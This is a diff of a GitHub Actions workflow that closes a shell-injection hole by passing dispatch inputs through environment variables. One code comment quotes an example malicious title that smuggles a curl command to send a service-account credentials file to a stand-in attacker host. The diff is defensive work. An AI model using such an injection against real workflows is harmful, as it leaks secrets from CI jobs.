@@ -51,19 +51,41 @@ jobs:
         with:
           node-version: 20
       - run: npm ci
+      # Inputs are passed through `env:`, never interpolated into the shell.
+      #
+      # `${{ inputs.title }}` inside a run: block is substituted as TEXT before
+      # bash ever sees the script, so a title of
+      #     x"; curl -d @$GOOGLE_SERVICE_ACCOUNT_JSON evil.example; #
+      # runs as a command with every secret in this job's env. Going through
+      # env: makes the value a shell VARIABLE, and "$TITLE" is just a string
+      # however it is spelled.
+      #
+      # Dispatching this needs repo write access, so it is not a way IN — but
+      # it is a way for one compromised collaborator session to reach the
+      # service-account and database credentials, and the fix is free.
       - name: Add commitment
         env:
           DATABASE_URL: ${{ secrets.DATABASE_URL }}
+          IN_CLIENT: ${{ inputs.client }}
+          IN_TITLE: ${{ inputs.title }}
+          IN_DESCRIPTION: ${{ inputs.description }}
+          IN_PRIORITY: ${{ inputs.priority }}
+          IN_STATUS: ${{ inputs.status }}
+          IN_OWNER_TYPE: ${{ inputs.owner_type }}
+          IN_ASSIGNEE: ${{ inputs.assignee }}
+          IN_DUE: ${{ inputs.due }}
+          IN_CATEGORY: ${{ inputs.category }}
+          IN_DRY_RUN: ${{ inputs.dry_run }}
         run: |
           args=()
-          args+=("--client=${{ inputs.client }}")
-          args+=("--title=${{ inputs.title }}")
-          [ -n "${{ inputs.description }}" ] && args+=("--description=${{ inputs.description }}")
-          args+=("--priority=${{ inputs.priority }}")
-          args+=("--status=${{ inputs.status }}")
-          args+=("--owner-type=${{ inputs.owner_type }}")
-          [ -n "${{ inputs.assignee }}" ] && args+=("--assignee=${{ inputs.assignee }}")
-          [ -n "${{ inputs.due }}" ] && args+=("--due=${{ inputs.due }}")
-          args+=("--category=${{ inputs.category }}")
-          [ "${{ inputs.dry_run }}" = "true" ] && args+=("--dry-run")
+          args+=("--client=$IN_CLIENT")
+          args+=("--title=$IN_TITLE")
+          [ -n "$IN_DESCRIPTION" ] && args+=("--description=$IN_DESCRIPTION")
+          args+=("--priority=$IN_PRIORITY")
+          args+=("--status=$IN_STATUS")
+          args+=("--owner-type=$IN_OWNER_TYPE")
+          [ -n "$IN_ASSIGNEE" ] && args+=("--assignee=$IN_ASSIGNEE")
+          [ -n "$IN_DUE" ] && args+=("--due=$IN_DUE")
+          args+=("--category=$IN_CATEGORY")
+          [ "$IN_DRY_RUN" = "true" ] && args+=("--dry-run")
           npm run add-commitment -- "${args[@]}"
